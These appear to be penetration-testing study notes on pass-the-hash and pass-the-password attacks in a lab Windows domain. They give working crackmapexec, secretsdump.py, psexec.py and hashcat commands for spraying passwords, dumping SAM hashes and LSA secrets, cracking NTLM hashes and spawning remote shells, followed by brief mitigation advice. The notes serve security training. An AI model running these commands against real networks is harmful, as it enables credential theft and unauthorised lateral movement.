# Pass the Hash / Pass the Password

If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

### crackmapexec
Can use **`crackmapexec`**, can grab hashes and pass these or do the same with a password

```
sudo apt install crackmapexec
```

```
sudo crackmapexec smb 10.10.10.0/24 -u fcastle -d MARVEL.local -p Password1
```
Good to do password springs only on local accounts (less risk of getting locked out)
![pth-1](https://user-images.githubusercontent.com/87711310/209465215-b6d46b5b-23d9-4869-a2c3-4f0e130b2011.png)

We can also use an option to try and get (and dump the sam hashes)
```
sudo crackmapexec smb 10.10.10.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```

![pth-2](https://user-images.githubusercontent.com/87711310/209465218-eecf82e7-ee52-47f5-86ab-ca3c0e1b129c.png)

now we know that fcastle is admin on the 10.10.10.4 machine. 
Can span shell:

```
sudo psexec.py marvel/fcastle:Password1@10.10.10.4
```



### secretsdump.py
Can use **`secretsdump.py`** as part of the Impacket tool

```
sudo secretsdump.py marvel/fcastle:Password1@10.10.10.5
sudo secretsdump.py marvel/fcastle:Password1@10.10.10.4
```
![pth-3](https://user-images.githubusercontent.com/87711310/209465219-87098c21-aaca-41e0-b6b7-8bfa6ee680f2.png)

will dump not hust hashes but also, LSA secrets, DPAPI
We will focus on any local SAM hashes we get back. 

Put all hashes into a file (only user and admin ones)
These local hashes are NTLM (not ntlmv2) stored under module 1000
If we cannot crack them, we can try to pass the hashes around
Can only pass NTLM not NTLMv2 hashes around

```
sudo hashcat -m 1000 /usr/share/wordlists/rockyou.txt -O
```
-O for optimisation 
![pth-4](https://user-images.githubusercontent.com/87711310/209465220-db73c032-5f26-425d-b53c-54b109ef3db3.png)

Passing Frank Castle's hash around
```
sudo crackmapexec smb 10.10.10.0/24 -u "Frank Castle" -H 5835...0ef --local-auth
```
![pth-5](https://user-images.githubusercontent.com/87711310/209465221-c15f352d-e7bf-4b9a-b415-6a520a364e2b.png)

## Pass the Hass/Password Mitigation
Hard to completely prevent, but can make it more difficult for the attacker:

- Limit account re-use
	- Avoid re-using local admin password
	- Disable Guest and Administrator accounts
	- Limit who is a local administrator (least priviledge)
- Utilise strong passwords
	- The longer the better (>14 characters)
	- Avoid using common words
	- Long sentences are good
- Privilege Access Management (PAM)
	- Check out/in sensitive accounts when needed
	- Automatically rotate passwords on check out and check in
	- Limits pass attacks as hash/password is strong and constantly rotated


